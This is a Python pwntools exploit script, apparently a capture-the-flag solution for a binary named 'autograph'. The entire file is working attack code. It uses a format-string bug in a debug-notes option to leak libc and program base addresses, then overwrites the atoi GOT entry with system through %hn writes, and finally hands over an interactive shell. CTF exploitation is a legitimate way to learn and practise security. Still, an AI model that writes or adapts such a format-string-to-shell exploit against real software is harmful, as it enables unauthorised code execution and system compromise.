#!/usr/bin/python3

from pwn import *

exe = ELF("autograph", checksec=False)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(
            p,
            gdbscript="""
                b*debug_notes+83

                c
                """,
        )
        input()


info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
    p = remote("")
else:
    p = process(exe.path)

# GDB()


def add(payload):
    sla(b":", b"1")
    sla(b":", payload)


def view():
    sla(b":", b"2")


def debug(payload):
    sla(b":", b"9")
    sla(b":", payload)
    p.recvuntil(b"You Notes:\n")


payload = b"%37$p.%39$p."
debug(payload)
libc.address = int(p.recvuntil(b".", drop=True), 16) - 0x43654
exe.address = int(p.recvuntil(b".", drop=True), 16) - exe.sym.menu - 247
info("libc base: " + hex(libc.address))
info("exe base: " + hex(exe.address))
system = libc.address + 0x50D60
atoi = exe.address + 0x4038
packet = {
    system >> 0 & 0xFFFF: atoi,
    system >> 16 & 0xFFFF: atoi + 2,
    system >> 32 & 0xFFFF: atoi + 4,
}
res = sorted(packet)
payload = f"%{res[0]}c%11$hn".encode()
payload += f"%{res[1]-res[0]}c%12$hn".encode()
payload += f"%{res[2]-res[1]}c%13$hn".encode()
payload = payload.ljust(40, b"a")
payload += flat(
        packet[res[0]],
        packet[res[1]],
        packet[res[2]]
)
debug(payload)

p.interactive()
